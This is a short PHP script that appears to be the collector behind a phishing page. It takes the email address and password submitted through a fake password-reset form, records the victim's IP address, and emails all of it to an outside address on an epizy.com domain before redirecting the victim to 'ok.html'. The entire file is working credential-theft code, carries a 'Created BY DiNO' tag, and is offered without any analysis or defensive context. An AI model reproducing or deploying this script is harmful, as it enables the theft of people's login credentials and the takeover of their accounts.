<?


$ip = getenv("REMOTE_ADDR");

$message .= "--------------New Login--------\n";

$message .= "Email address : ".$_POST['uname']."\n";

$message .= "password : ".$_POST['psw']."\n";

$message .= "Client IP : ".$ip."\n";

$message .= "---------------Created BY DiNO-----------\n";

$send = "Robert.Heuschneider@lutz-jesco.epizy.com";

$subject = "New Log (Password-Reset) 

$ip";


mail($send,$subject,$message,$headers);




$redirect = "ok.html";

header("Location: " . $redirect);
 
?>